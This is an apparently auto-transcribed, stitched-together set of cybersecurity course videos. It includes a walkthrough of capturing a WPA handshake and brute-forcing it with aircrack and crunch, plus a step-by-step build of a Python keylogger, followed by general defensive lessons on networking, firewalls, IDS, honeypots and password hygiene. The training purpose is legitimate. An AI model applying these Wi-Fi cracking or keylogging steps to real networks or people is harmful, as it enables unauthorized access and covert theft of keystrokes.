we have the wpa handshake file
once the handshake file is captured you
can actually close this and here we go
congratulations in order to capturing a
handshake it has verified that a pmk id
from the target network has successfully
been captured
this is the file that is already stored
so dot cap file for the path we can
let's say we can keep it in a desktop
okay we give the path
and the handshape file is generated
we can already see
a target over here same geo24 router
with the bssid
now if we return to its main menu
we already have the handshake file
captured with us now our job is to brute
force into that handshake capture file
the capture file is often encrypted with
the security key of the wifi network if
we know how to decrypt it we will
automatically get the security key
so let's go to the offline wpa wp to
decrypt menu
since we'll be cracking personal
networks we can go with option one
now to run the brute force tool we have
two options either we can go with the
aircrack or we can go with the hashcat
let's go with aircack plus crunch which
is a brute force attack against a
handshake file
we can go with option two
it can already detect the capture file
that we have generated
so we select yes
the bssid is the one which
denotes the jio24 router so we're going
to select yes as well the minimum length
of the key for example it has already
checked that the minimum length of a
wi-fi security key which is a wpa to psk
key will always be more than eight
digits and below 64 digits so we have to
select something in between this range
so if we already know let's say that the
password is at least 10 digits we can go
with the minimum length as 10
and as a rough guess let's say we put
the maximum length as 20
the character set that we're going to
use for checking the password
will affect the time taken to brute
force
for example if we already know that or
we have seen a user use the password
while connecting to the router as
something that has only numbers and
symbols then we can choose accordingly
let's say if we go with only uppercase
characters and numeric characters
go with option 7. and it's going to
start decrypting
so how aircrack is working right here
you can see this passphrase over here
the first five or six digits
are
a
it starts working its way from the end
from the last character it keeps trying
every single combination you can see the
last the fourth character from the right
side the d it will eventually turn to e
because it keeps checking up every
single character from the end
this will keep going on until all the
single characters are tested and every
single combination is tried out
since the handshake file is encrypted
using the security key that is the wpa2
key of the router
whichever pass phrase is able to decrypt
the handshake key completely will be the
key of the wi-fi router
this is the way we can brute-force into
wi-fi routers anywhere in the world the
internet is an endless source of
information and data still in some cases
we come across some occurrences like
cyber attacks hacking force entry which
may affect a time on the web to
understand the key logging problem
better let's take a look at an example
this is june she works in a business
firm where she manages the company's
data regularly
this is jacob from the information
department who's here to inform her
about some of the security protocols
during the briefing she informed him
about some of the problems her system
was facing with which included slow
reaction speed and unusual internet
activity
as jacob heard about the problems with
the system he thinks of the possibility
what could be the reason behind these
problems her system was facing with
the conclusion that he came across was
the key logging issue
unknown to the problem her system was
facing with she asked him about some of
the details regarding it
for today's topic we'll learn what
exactly keyloggers are and how they
affect our system what are the harmful
effects that key logging can bring into
the system
for today's agenda we learn what exactly
the key logging program is
then we'll see how the system gets
infected what are different methods how
the key logging issue enter into the
system
then we'll take a look at different
types of methods how to detect the key
logging issue into the system
then we'll take a look at different
types of keyloggers that are present and
how they affect differently into the
system
then we'll take a look how the hackers
use the recorded data that has been sent
by the key logging
program and then we'll take a look at a
case where the mobile devices get
affected with the key logging issue
and lastly we will take a look what are
different prevention methods available
to prevent the system from getting
infected by the key logging issue
to begin with we learn what exactly the
key logging program is
as the name suggests keylogger is a
malicious program or a tool that is
designed to record keystrokes that are
typed during data input and record them
into a log file
then the same program secretly sends
these log files to its origin
where they can be used for malicious
acts by the hacker
now that we know what the key logging
program is let's take a look how they
enter into the system
searching for a suitable driver for a
system can often lead to the
installation of the key logging program
into the system if we often visit
suspicious sites and uncertified
software are installed into our system
then
if we use unknown links or visiting
unknown websites which come through
unknown addresses can also be a reason
behind a key logging issue entering into
the system
and lastly there are often cases where
different pop-ups that we often see on
social sites or different media sites
can lead to the installation of
keylogging program into a system
now that we know how the problem gets
into the system let's take a look how to
identify whether the system is infected
by the key logging issue
the key logging issue can be identified
if there are often cases when a keyboard
lags behind the system
the data that we enter sometimes is
stuck in between when we type through
the input
then
there are cases when the system freeze
occurs unknowingly to what exactly could
be the reason behind them and also there
are delayed reaction time for different
applications that run on the system
and lastly there are different cases
when we often see suspicious internet
activity on the system that we don't
know about
this could lead to the identification of
a problem into the system
now we'll take a look at different types
of key loggers that are present on the
net which can harm our system
differently
the first problem that keyloggers arouse
is api based the most common key logging
case which uses apis to keep a log of
the type data and share it to its origin
for malicious purposes
each time we press a key the key logger
intercepts the signal and locks it
then we have form grabbing based key
loggers as the name suggests they are
based key loggers that store the form
data that is if we often use web forms
or different kinds of forms to enter
different data they can be recorded into
the system by the program and send it to
its origin
then we have kernel-based keyloggers
these keyloggers are installed deeply
into the operating system
where they can hide from different
antivirus if not checked properly and
they record the data that we type on the
keyboard and send it to its origin
and lastly we have hardware keyloggers
these keyloggers are present directly
into the hardware that is they are
embedded into system where they record
the data that we type on the keyboard
now let's take a look how hackers
differentiate different type of recorded
data and exploit them
when hackers receive information about
the target they might use it to
blackmail the target which may affect
the personal life of the target and also
blackmail them for different money
related issues
then in case of company data that is
recorded by the key logging program can
also affect the economic value of the
company in the market which may lead to
the downfall of the company
also in some cases the key logging
program can also log data about military
secrets which may include nuclear codes
or security protocols which are
necessary to maintain the security of a
country
now let's take a look whether mobile
devices get infected with the key
logging issue or not
in the case of hand devices infection of
keyloggers are low in comparison to the
computer systems as they use on-screen
keyboard or virtual keyboard
but in some cases we often see different
kinds of malicious programs getting
installed into the hand device if we
often visit different uncertified
websites or illegal websites or torrent
sites
and also the device that is infected
with the keylogging issue or different
kind of malicious program can often lead
to the exploitation of data that
includes photos emails or important
files by the hacker or the cyber
criminal that install the particular
malicious program into the system
now to prevent our system from getting
infected by the key locking program
let's take a look at different points
the first point includes using of
different antivirus softwares or tools
which can prevent the entering a
malicious program into the system
then keeping system security protocols
regularly updated is also a good habit
and lastly using virtual keyboard to
input our sensitive data which may
include bank details login details or
different passwords related to different
websites
now that we have some understanding
about the topic of keyloggers let's take
a look at the demo to further increase
the knowledge about the topic
for the first step we have to download
some of the important libraries that are
required into the
system which is
this library
now we'll run it
the system says
the library is already installed into
the system
now let's take a look what exactly
modules are required from the particular
library
from this library we'll import
the keyboard module which will help us
to record the data that we type on the
keyboard
now
from the same we'll also import
key module
and the listener module
and also
the logging module
which will help us to record the data
into a log file
for the next part we'll write a piece of
code that will allow us to save the data
that is recorded by the program into our
text file that will be named as key
underscore log text file along with the
date and time stamp
let's take a look
now
we'll provide it with the file name
that will be given as
k log
dot
txt file
and also so the part where the format of
the data is recorded
put the brackets over here
to contain the file name
now we will write the format in which
the data will be recorded into the log
file
which will be given as
the format would be
the message and the timestamp which
would be given as
along with
the
timestamp
given as
percentage
and ending it with the bracket
now for the next step we'll design
two of the functions that will be used
into the program that will be termed as
while press function and while release
function let's take a look
while
press function
would be a function
that will come into play
when the keyboard key has been pressed
is
pressed
and
this would go for the
format that we designed
in the above line
and
logging
the pressed key
info
a string file
to be recorded
into the
log file now
now we will design a function that is
while
release
that will come into play
when
the escape key
has been
pressed that is the program will
dominate itself and the program will
stop from running
and in the end
we require for the functioning
of the program to loop these functions
that is while press and while deletes to
continue its cycle
that will be going for
while
press
and
on
release will contain
while release
function
as
listener
and now
this part
would join the different threads and
store them into the log file
now that we have completed the code for
the program let's run it
we have to wait for a moment so the
program runs it
now
to verify the program let's open notepad
and on the notepad
we'll write
hello world
which will be the basic whether the
program is working or not
let's take a look
and we will go for the main page on
jupyter notebook
and refresh the page
go to the bottom
over here
we see the key log text that is the text
file that we created
let's open it
and over here we have the data
that is created
as we started with
node
then this is a hello world part that we
created just now
which shows that the program we created
is working properly if getting your
learning started is half the battle what
if you could do that for free visit
skill up by simply learn click on the
link in the description to know more
now let's go a little bit further and
see what would motivate people for
committing such cyber crimes right the
first and foremost motive is disrupting
business continuity others would be
looking at data theft or information
theft and manipulating that data to gain
from that data so if i'm able to access
your computer and steal some data that
has some value to you and sell it or
make it public you would be at a
financial loss because that data no
longer has any value creating fear and
cures by disrupting critical
infrastructure for example a company's
infrastructure crashes the services are
no longer being offered by that
organization and people start panicking
uh start fearing an attack by cyber
criminals and
it leads to chaos financial loss to the
target which is very obvious if i do a
denial of service attack or if i make a
service and a variable from an
organization what is going to happen is
since that service is not functioning uh
the company is not going to make any
money out of it and that's going to
suffer a financial loss achieving states
military objectives a one country spying
on another country trying to gather
information about their military
intelligence military activities or any
other activities that can harm the
original country demanding ransom
hackers can encrypt your data and then
demand a ransom from you in lieu of
decrypting the data again damaging
reputation of a target impersonating a
user on the social media platforms
making false statements thus damaging
the reputation of that person and
propagating religious or political
beliefs religious fanatics promoting
whatever cultures that they want to
promote trying to gain more followers
thus bringing more unrest to the world
any of these could become motives for
cyber crime so this is why we want
cybersecurity cybersecurity should be in
place to prevent these kind of attacks
so what exactly is cyber security it
refers to the practice of protecting
networks programs computer systems and
their components from unauthorized
digital access and attacks so whatever
your digital footprint could be servers
computers switches routers web servers
web applications that you're hosting
over there services that you're
consuming from the cloud or providing to
other customers you need to secure all
of these to ensure that the integrity
and the confidentiality of these
services is intact and none of these
services are affected by any cyber
attacks which could lead to disastrous
results so the main difference we want
to understand here is the difference
between cyber security and information
security information security is data
within the organization where they
handle sensitive information or
proprietary information copyrighted or
patented information and they want to
secure it from data leaks or having that
data in somebody computer's hands cyber
security is basically a technique used
to protect the integrity of network so
this is when you're going to go on the
web and on the internet you're going to
secure your devices that you have
deployed allowing people to access your
infrastructure from the outside so what
could be the cost of not being cyber
secure if you get hacked or if your data
is compromised or if your information is
compromised you could have a lot of
repercussions your good will be go for a
task you may be open for lawsuits not
only from clients but from customers as
well you could be open for fines or
penalties from government organizations
for failing to follow the law of the
land customer trust will obviously be
hampered if you have been hacked and
your data has been compromised you
wouldn't want to deal with that
organization in the future all of this
could land the organization in a
financial crisis where all the lawsuits
and penalties that are being imposed
could basically bankrupt that
organization and does
take it out of circulation so now let's
look at some basic terminologies which
we need to understand to go further in
the cybersecurity world first and
foremost network what is a network
network is nothing but a group of
interconnected devices could be servers
could be workstations could be laptops
could be any devices file printers and
what not to be interconnected with each
other as you can see in the in the
diagram it is used for communications
it's used primarily used for data
transmissions
and to communicate between various
terminals so that the business can go on
it is also used to share data
information it could be wired or
wireless so you got a wired lan or at
home we all have wireless networks where
we connect all our devices we use them
for streaming videos we use them to
connect to the internet so websites work
from home so we've got office also set
up on our wi-fi so a network is nothing
but a collection of interconnected
devices that are allowed to communicate
each other freely so that the business
can be continued in a proper manner
server the server is nothing but a
hardware device that is supposed to
handle requests of data information
allow network services to function from
other computers and devices so this is
where we build a client server
relationship where on the server we've
got uh we've got the major software we
got the d we got the data that is stored
over there and clients that interact
with the server to consume that data in
a particular manner that would help them
make sense and analyze that data and
generate business out of them then the
internet internet is nothing but the
collection of multiple networks globally
so all the networks that we have across
the globe when they are interconnected
with each other that is what internet is
and if we just go back and we talk about
servers this is what allows the internet
to be formed so every organizations when
they publish their servers on the
internet and they allow everyone to
interconnect through those servers that
is where the internet comes in being the
servers being the backbone of the
internet obviously for the servers to
communicate with each others we will
need switches routers and other devices
for the data transmissions to happen so
these are the multiple networks could be
individual networks internet
interconnected together would form the
internet across the globe for the
internet to work there would be a set of
protocols for transmissions to be
allowed across the globe now this is
where tcp iep or the transmission
control protocol over internet protocol
comes into the picture so if you
remember we use communication channels
like tcp or the transmission control
protocol and udp user datagram protocol
when we connected connect to web servers
we talk about the http protocol and
https protocol if you wanted secure then
we'll talk about imap pop3 and all of
these protocols now where do these
protocols come from it is nothing but a
suite of the tcpip software which
contains all of these protocols which
allow computers to communicate with each
other if tcp wouldn't have been there
our network would have collapsed now
when we have tcp ip and we want to
communicate across the globe how would
we identify devices on the internet or
even on the intranet because the devices
don't know us they are not going to use
our usernames and passwords to
communicate with each other but when i
want to connect to a website or a device
how do i identify it on the intranet or
the internet i obviously use ip
addresses now ip addresses are nothing
but the internet protocol addresses
which are 32-bit addresses which look
exactly like the one shown on your
screen 172.16.254.1
now there is a lot of classification of
ip addresses and some of these ip
addresses work on the internet some of
them are supposed to work on private
lands but i will reserve that for a
later topic then the second way that we
are identified on the internet or the
internet are with mac addresses so media
access controls or mac addresses are
hard-coded addresses that are given to
our network interface cards these cannot
be modified physically at any point in
time however there are techniques to
spoof mac addresses which we can then
obfuscate our existing address and give
us a new one that would again be
discussed in a later in a later lecture
a router we've been talking about
routers and switches router is nothing
but a device that passes packets back
and forth across networks it routes the
data in the appropriate path so it is an
intelligent device it can understand ip
addresses and mac addresses it can
identify different parts of reaching a
particular network for example if i'm
sitting in india and i want to
communicate across the world to america
there would be a specific path that
needs to be followed for my data packet
to reach the other side of the world it
is the routers that would map this path
store it in their cache so when i tried
to connect to that server they would
retrieve it from the cache and send the
packet across the globe so
the home router that we use at home on
wi-fi is our default gateway to connect
to the internet and thus it allows our
internal devices to communicate with
each other within using internal ip
addresses and when we want to go to the
internet it will then route the traffic
on the internet and send the packet to
other servers that we want to
communicate with now what is a domain a
domain is referred to as a group of
computers and other devices that are
interconnected and treated as a whole
now a do menu is used by an organization
so let's say if i am xyz xyz being the
name of the organization and i want to
create and a domain which would allow me
to create a group of interconnected
computers for my employees to
interconnect with each other and send
and manage data i'm going to create a
domain for my organization and attach
all the devices create users and
interconnect them using a domain so this
is where you're going to have a
centralized approach of a server client
relationship where you're going to have
a main domain and you're going to have
devices connected to the domain now when
we go to the internet the domain name is
nothing but the base part of a website
name so when you say google.com and you
type it in your browser you're taken to
the webpage called google.com which is
the search engine that you're connecting
but for google the organization at the
other end they would have a data center
over there which would have all that
relevant data which allows you to search
through that information so for them the
domain would be the internal part where
they've got this cluster of servers
creating a data center where all that
information is stored but for us as
consumers a website called google.com
would be a domain forest to visit that
particular website and consume the
services that they're offering on the
internet so here the example is https
which means that it is a secure website
port 443 and we're connecting to
cybersecurity.com
cybersecurity.com becomes the domain
name https becomes the protocol that we
want to utilize to connect to that
particular website then we come across
dns or the domain name system it is
nothing but an index something like a
phone book which is responsible for
mapping the domain name into its
corresponding ip address now remember i
said that there are only two ways we are
identified on the internet or the
intranet either the ip address or the
mac address if it is devices if it is
computers who are talking to each other
it would obviously be ip addresses but
if i type in google.com i'm giving it a
domain name the internet does not
understand domain names so there is a
dns a server which is an index or works
like an index or more like a phone book
which will have a list of all the
domains with the corresponding ip
addresses so whenever i type in
google.com the request goes to a dns
server the dns server is queried the ip
address of google.com is identified
pasted onto the packet and then the
packet is routed through the router to
the path that it has determined to reach
the google.com server here replace
google.com with cybersecurity.com so as
you can see on the screen the local pc
queries the dns server the dns server
replies back with the ip address now if
you're wondering how does this work if
we're going to take an example of home
networks the isp or the internet service
provider gives us a default gateway or a
router with their own ip addresses for
dns servers and default gateways so when
we try to connect through the router the
router has the ip address of the dns
server and it routes that query to the
dns server the dns server replies back
with the appropriate ip address the
router then takes that ip address
figures out the path and sends it across
to the targeted server dhcp or the
dynamic host configuration protocol it
is a protocol that dynamically assigns
ip addresses to the devices in the
network so we have discussed that ip
addresses are required by computers to
communicate within each other but who
associates or who gives these ip
addresses to these computers so for that
to happen we have got a dhcp server that
is created if you take your home
networks it is the router that has the
dhcp role installed on it so whenever a
machine boots up it sends out a
broadcast request looking for the dhcp
server and then there's a communication
with the dhcp server the dhcp server
then allocates an ip address to the
computer who is requesting it and once
the ip address is allocated an entry is
made in the dhcp servers cache with the
corresponding mac address of that
particular machine then we come to the
next top topic called vpn or a virtual
private network it is a connection
between a vpn server and a vpn client
it's basically a encrypted channel that
you're creating between two end points
and the main reason for a vpn is to
encrypt your data so that it is now no
longer subject to man in the middle or
eavesdropping or modification attacks so
this is a layer of security that you're
adding when you're connecting to the
internet using an encrypted channel
which should prevent you from getting
hacked or your data being compromised by
hackers so as you can see here and if
you remember the previous top uh
previous slides that we have seen the
hacker was able to copy the data very
easily now that it is an encrypted
channel even if the hacker tries to
eavesdrop and capture that data it will
be formatted in such a way that they
would not be able to make sense out of
it now the attacker or the hacker will
try will have to try to decrypt the data
so that's another attack that they'd
have to execute to find out the
encryption key decrypt the data and then
look at what the data was then we come
across botnet now first let's first
understand what bots are bots are
nothing but the softwares that can be
installed on vulnerable machines that
would allow the hacker to send commands
to the infected machines to generate
some traffic or to do what the command
tells them to do so most of the botnets
are used for distributed denial of
service attack if you remember the dos
and ddos that were discussed a while
back this is where we tied up with how
they are executed so a bot master or a
hacker let's call them a hacker would
try to identify vulnerable devices
across the internet and try to install
the bot onto those devices the bot
essentially is a software that would
revert back to the bot master and
advertise their availability whenever
they have been powered on a collection
of such infected devices would
essentially be called a botnet when
there are enough number of machines that
the attacker fill fields are good enough
to launch that attack on the targeted
servers the hacker will then initiate
those devices send the commands through
the bot master to the bots and the bots
would then generate that kind of traffic
what uh whatever they have been
configured for and then attack the
targeted server now this is also done to
opt to mask the identity of the hacker
since the attack is being generated
through the botnet the ip addresses of
the botnet computers would be reported
to the targeted server not the actual
hackers ip address so it to figure out
who the attacker was would be very much
difficult depending on the size of the
botnet so this you can see is the attack
that has been created over the victims
and the malicious traffic has been
generated through the botnet and the
victims have been targeted through that
so as said once that traffic has been
done to forensically investigate at the
victims and they would find the ip
addresses of the botnet and not the
attacker all right let's start talking
about network security controls network
security controls are nothing but
implementations of various devices to
enhance the security of a particular
network these could be firewalls
intelligent detection systems or
intrusion prevention systems honeypots
unified threat management systems and so
on so forth the next gen firewalls that
we talk about right so let's look at a
review of what these devices are now a
firewall can be a hardware or a software
that is responsible for allowing or
disallowing a certain amount of traffic
to or from your computer so these are
basically created to enhance the
security portion of your network where
you can configure them for certain level
of traffic to be allowed or some traffic
to be disallowed now a firewall is not
going to decide by itself what is a good
amount of traffic or what is bad traffic
you're going to configure the firewall
by creating rules based on ip addresses
port numbers protocols and what may and
based on this the firewall will then
analyze the traffic coming in or going
out to the inbound or the outbound rules
and if the traffic is allowed it will
allow the traffic to go through if
there's an explicit rule which says deny
the traffic it will drop the packets or
it will delete the package it will not
allow the packets to go past it so if it
is good traffic that means it matches a
rule that has been created that allows
the traffic to go through the firewall
will allow it if it's bad traffic that
means that there is a rule which denies
the traffic to pass through it will get
blocked at the firewall level itself it
will the firewall will not allow it to
enter the network similarly intrusion
detection system it is designed to
detect unauthorized access to systems or
intrusion attempts as well now it works
along with the firewall and the main
thing is that here there's a database
against which it can compare the traffic
so most of the attacks that we've talked
about there are some distinct signatures
that would cause concern or that would
highlight that kind of an attack most of
the organizations try to develop these
kind of signatures have them in a
database and store them on the ids so
that ideas can analyze the incoming
traffic look at patterns from the
traffic coming in or going out compared
to the database of the signatures that
it has and if it matches any of the
signatures it will then detect that as
an attack and send an alert to the
administrator where the administrator
will then have to manually come in and
check it out intrusion prevention system
as described earlier or as mentioned
earlier can be configured to react to
that particular event so if it detects
something that can be classified as an
intrusion an administrator can
pre-configure it to to react to that
particular packet in a particular manner
for example drop the packets or reflect
them to a honey pot or want the
administrator or do all of these things
at the same time so as you can see on
the diagram and the internet there's a
hacker a sense of the data packets come
in the firewall is not able to analyze
the traffic because
a firewall cannot analyze the contents
of a packet it can only look at the
header it can only look at the ip
addressing
and um the ports that uh that have been
created or the rules on which those
things have been mentioned and then it
allows the data to go through it reaches
the ideas the ideas then looks at two
ways to scan one is a signature that
we've just spoken about where the
developer of the ids creates those
signatures and stores them onto the
database or another thing that is known
as heuristic scanning which is nothing
but behavioral scanning so it looks at
the behavior of the data and if the
behavior looks malicious it will then
raise an alert and warn the
administrator then let's come to
honeypots we just discussed in the
previous slide that an ips or an
intrusion prevention system can be
pre-configured that if it detects an
animally or if it detects an intrusion
it may redirect the traffic to a
honeypot what is a pot a honey pot is a
decoy system it is created to showcase a
certain set of vulnerabilities to try to
attract the attention of an attacker now
the word here is used as lure but it's
more to deceive the attacker for example
if the attacker has been able to bypass
your firewall and your ids and now can
scan the entire subnet when they scan it
they would come across a device which is
pretty vulnerable or showcases some
vulnerabilities which would definitely
interest the hacker because they would
think that it is a vulnerable server
which contains some valuable data and
that exactly what honeypot is it's a
decoy server trying to
trying to act as a production server
trying to showcase that it has some
valuable data but also has some
vulnerabilities in it so that the
attacker can be attracted towards it and
spend some time trying to attack it or
analyze the honeypot at the same time
the honeypot will analyze the data
traffic and it will warn the
administrator of a possible intrusion
which will give the administrator enough
time to secure the rest of the network
and we'll also get to analyze the logs
of the honeypot and to try to understand
what kind of attacks that attacker is
trying to create and try to reverse
engineer and identify the attacker at
the same time let's talk about security
testing security testing is nothing but
a method which is carried out to
identify threats and loopholes in a
system so here we are going to do a
vulnerability analyst and penetration
test we may also go ahead and do a
security audit so what is vulnerability
scanning penetration testing and
security auditing vulnerability scanning
is the activity which you are conducting
to identify or look at possible
weaknesses or issues or vulnerabilities
or misconfigurations that exist in your
infrastructure so it is a proactive way
where a team of security experts will
launch a vulnerability scanner scan
certain devices that they have
pre-identified and once the report from
the vulnerability scanner comes in try
to analyze the report and make sense out
of it to see if there any
vulnerabilities that can be identified
on those devices this is obviously an
ongoing process why because operating
systems are patched upgraded new
versions of softwares are released and
we keep on upgrading and we keep on
changing our id infrastructure ever so
often and hence the iit infrastructure i
guess say is an ever evolving process
and to be a priest of all the latest
vulnerabilities and threats we need to
do the vulnerability analysis
in an ongoing manner to identify
possible threats to the organization so
then what is penetration testing
vulnerability analysis is just
identifying the vulnerabilities gaps
misconfigurations that may be in the
organization's infrastructure a
penetration test is basically to
validate whether those vulnerabilities
that have been reported are real if yes
how complex are they what would be the
impact and what would be the
technological impact and what kind of
data would be compromised or what would
be the end result of that attack if it
actually happens in the real world so
here a bunch of ethical hackers would
simulate an attack from a hacker's
perspective or from an insider's
perspective a malicious outsider or a
malicious insider depending on how they
perceive the vulnerability as and then
they will try to test the vulnerability
to see how it can be exploited to what
extent it can be exploited and what
would be the compromise or what would be
the data leakage that would happen if
this vulnerability gets exploited so
there are three ways a penetration test
can be conducted there is a black box
testing a gray box testing and a white
box testing if you look at black box
testing this is where the tester or the
penetration tester rather has no
knowledge about the organization their
infrastructure applications or anything
so this is where you're simulating a
hacker who's sitting on the outside who
has no knowledge about the organization
so they start from the information
gathering phase where they're going to
try to figure out the ip addresses the
ip ranges devices operating systems
applications and anything and everything
that the organization is going to use
and then try to figure out
vulnerabilities within them and then try
to attack those vulnerabilities this is
a very time consuming and a cost
consuming audit the second one is a grey
box testing audit where a partial
knowledge is given to the penetration
tester so this simulates a regular user
kind of an attack so let's say if i'm a
regular user in an organization and by
when i say a regular user i'm saying i'm
not an administrator so i have got
limited access and based on that limited
access and the limited knowledge that i
can gather about the infrastructure by
being a regular employee we are going to
simulate a test with that knowledge to
see whether a employee can take
disadvantage of any vulnerabilities or
and then try to worm their way into the
organization's infrastructure and hack
it the white box testing on the other
hand is where we're looking at an
insider a malicious insider who already
has all the accesses who already has all
the controls in his hand so simulating
and administrative access and then
trying to figure out whether this
administrator can escalate their
privileges and gain some other
administrators access and try to then
compromise data for example even if i'm
saying i'm an administrator i am not the
only administrator in the organization
there would be backup administrators
there would be system administrators
there would be the active directory
administrators there would be
application administrators database
administrators and so on so forth so
every single component that we have may
have a different administrator for
example switches would have a different
administrator same thing with firewalls
or any other security controls that you
have so if i am a administrator for
backup can i then try to work my way out
escalate my privileges as a regular
administrator or a system administrator
and then crack their passwords try to
get access and manipulate some data so
these are the three types of penetration
testing audits that you will come across
there would be some different subtypes
but every organization can customize
these kind of audits to whatever they
require then we come to security
auditing security auditing is nothing
but an internal check that is carried
out by internal auditors that means
people who are employees within the
organization to find out flaws in the
organization's information system now
this is more on the compliance side this
may
take inputs from the vulnerability
assessment and the penetration test but
overall we want to see what kind of
policies that we have in our
organization whether those policies are
working properly whether they make sense
are there any gaps and based on the
technical inputs from the vapd team how
do we map with the policies that we have
defined for that organization for
example a password policy now we have
documented that the password policy
should be effective enough that
passwords cannot be easily brute forced
so that's a high level policy then we
dictate a procedure for that policy to
be implemented where we say hey we want
the systems to be configured where the
password meets some complexity standards
for example uh should be uppercase and
lowercase a through z zero through nine
should use special characters and should
be randomized password should not be
dictionary based or based on the user's
name now these are this is the policy
that we have created and the procedures
that we have defined are they being
actually implemented in the real world
so a vulnerability analysis would
determine whether the passwords are
probably weak or not so if the
vulnerability report comes back and says
the passwords are probably weak then a
penetration tester would go in and then
try various attacks to see if passwords
can be compromised and if yes they would
then look at the complexity of the
passwords compare it to the procedures
and the policies and if they do not
match that's where your security
auditing comes into the picture so
you're basically tying up the policy the
procedures and the actual implementation
that you have created in an organization
now first and foremost what is cyber
security there are three main pillars of
cyber security that we deal with since
the inception of computers and they're
known as the confidentiality integrity
and availability triad also known as cia
not to be confused with the american
intelligence agency but here we're
looking at three different pillars where
we want our data to remain confidential
the integrity of the data to be intact
and the data to be made available at all
points in time so let's talk about these
three aspects the principle of
confidentiality asserts that the
information and functions can be
accessed only by authorized parties so
for example even if you password protect
your file what is it that you're trying
to do you're trying to prevent other
users accessing your data and peeping
into your files so that your data
remains confidential it is only shared
with people who know the password
integrity this is where the
trustworthiness of that data comes into
the picture where if the data is going
to be changed for example you have a
spreadsheet which has a lot of
information about users and their login
activities and whatnot and you want to
ensure that that data is not modified by
any unauthorized user so you're going to
verify that the information is correct
and is not
modified by anybody who's unauthorized
the availability part ensures that this
data is made available to all authorized
users when and where they want it right
the principles of availability assert
that in systems functions and data must
be available on demand according to
agreed upon parameters based on levels
of service now this is where your
service level agreement should come in
for example when we log on to gmail we
always assume that gmail is going to
work and it's going to be available
online at no point in time or very few
times has it ever occurred that you've
gone on to the internet typed in
gmail.com and the website is not
available in fact if the website doesn't
open we figure out the internet is not
working right but gmail as a service is
always made available now when we talk
about threats to cia the confidentiality
integrity and availability we talk about
them in two different parameters cyber
crime and hacking so what is cyber crime
cyber crime is any criminal activity or
any unauthorized activity that would
involve the usage of any computing
device which would result as a security
incident at the victim's end most cyber
crimes are carried out in order to
profit from them criminals would try to
do phishing attacks to steal your money
out of your bank accounts or who try to
con you into giving out your credentials
thus compromising your email accounts or
your social media accounts and try to
gain access to your identity cyber
crimes are generally carried out against
computers or devices directly to damage
or disable them spread malware secret
and steal secret information etc so this
talks about the motivation part of cyber
crimes what would be the motivational
aspect for a person to conduct such an
activity right so basically to cause
damage like wannacry happened in 2017
the perpetrators those those used
wannacry probably gained a lot in the
ransom that they demanded for that data
to be decrypted but it also cost the
world lot of money in profits that were
lost let's move on to titling cybercrime
so what what do we mean by cybercrime
now again we if you remember a few
slides back a few topics back we talked
about information security and we talked
about cyber security and we talked about
the difference between both of them
information security could be about
anything normally contained within the
organization the data that the
organization has and us securing those
data by introducing the security
controls that we talked about cyber
security would be something that is on
the internet or on the web so any web
application that i have deployed on the
internet any databases that i have that
would talk about cyber security so if
your facebook account gets hacked or
your onedrive gets hacked that's where
cyber security comes into the picture
but if your physical computer gets
hacked because your password got cracked
by a physical attack that's where your
information security is so some of the
basic ways of preventing cyber attacks
on us use unique and strong passwords
we've just discussed the complexity of
the passwords we want to keep them
random they should not be guessable they
should not be based on dictionary words
and they should be randomized in such a
way that they cannot be predicted or
guessed the length of the password
should be very good should at least the
minimum bare minimum should be eight
characters even that is not suggested in
today's world it has to be at least 12
to 16 characters an operating system i
think in today's world will support up
to 24 or 26 characters if you go into
encryption softwares they support up to
60 odd characters of passwords so you
want to keep those unique you want to
recycle those passwords on a regular
basis you do not want to reuse old
passwords again and again avoid public
wi-fi that's a must we always look for
free wi-fi we go to coffee shops because
they advertise free wi-fi that's now it
nowadays a unique selling point uh for
uh coffee shops and establishments and
we go there we connect to the wi-fi
because we get free internet and we get
to serve whatever we want the problem is
we have no idea who else is connected to
that wi-fi and what kind of attacks they
are creating we will discuss wi-fi
attacks later on in one of the later
videos where i can demonstrate how these
attacks work but for now just remember
that public wi-fi's are very
risky and if your security is not up to
the mark um you might just end up
getting hacked like nobody's business
ignore and delete mails from unknown
senders phishing attacks very common
attacks in today's world you get an
email saying you've won a lottery or
you've been chosen for something or
please don't click here to download your
free software and something like that
and those emails are plenty nowadays i
received an email yesterday where there
was a nigerian prince
who had died and he had left around 500
million dollars behind and there was
this accountant who wanted to smuggle
that money out and it was a huge email
giving me all the details and out of
seven billion people on this planet they
identified my email address and they
wanted to share half the money with me
so that they can masquerade the money
and avoid paying taxes inheritance taxes
and whatnot it was a ridiculous scheme i
mean being chosen out of seven billion
one out of seven billion um i mean our
luck can't be that good can it so you
have to be very about these attacks
always ask the question if you want a
lottery did you purchase the ticket no
so there's never a free lunch right so
always keep on questioning the things
that you've been getting i'm not saying
ignore them because some of them may
actually come true there's always that
one percent hope but always investigate
those things to see whether they are
spam if there is a fraud going on and if
yes you yourself can
communicate with the law enforcement
agency and try to figure out uh who is
responsible for that fraud make use of
antivirus software and always keep it
updated again uh let's not go for the
free antivirus softwares because they
have they may be good at detecting
infections but when they come for the
disinfecting those files then that's
where they ask for money and that's when
you're going to
run around and say okay let me see which
is the which is a very good antivirus to
disinfect this kind of a infection so uh
there are a lot of antiviruses out there
i know that and it's very confusing
which is the best one today now the
problem is whichever is the best one in
the market may not be the best one for
the operating system that you're using
for example i mean some
there would be a good antivirus for
windows 7 but the same antivirus
installed on windows 8 or windows 10
wouldn't be that effective so always do
an investigation the best way to look at
antiviruses and identifying which
antivirus suits you is to investigate
that antivirus and see the detection
rate of that antivirus see how often
does it detect
the infections that you're looking at
what you can do is you can head on to a
website called virustotal.com that's v i
r u s t o t a l dot com it's a google
owned website they have around 60 to 70
odd scanners on that website most of the
known antivirus scanners are there try
to figure out uh try to see if you can
get hold of an infected file be very
careful you don't want to get infected
yourself or i mean your computer you can
upload it to that particular website and
analyze that file and see which
antivirus detects those kind of viruses
a few files a few infections over here
and there and you will come to know
which antiviruses would work for you use
multi-factor authentication or two-step
processes for authentication just don't
rely on a username and password register
devices get otps either on your email or
on your devices and that gives you an
added layer of security if your password
gets compromised that's still okay
because now the hacker will need to
simulate your phone as well so that's
added
headaches and it may just not be worth
it there are so many other people who
don't use these kind of techniques who
can be hacked much easily than people
who have an added layer of security
introduced and be very careful when
you're downloading apps now when we say
applications on your mobile phones as
well as in your computers on your mobile
phone you still have a certain level of
security where you can go to the apple
marketplace or whatever it is called the
google marketplace or whatever it is
called and they do have some level of
control but when you talk about windows
operating systems and you're going on to
the open internet to look for different
kinds of softwares you have no idea
whether the website that you're on is
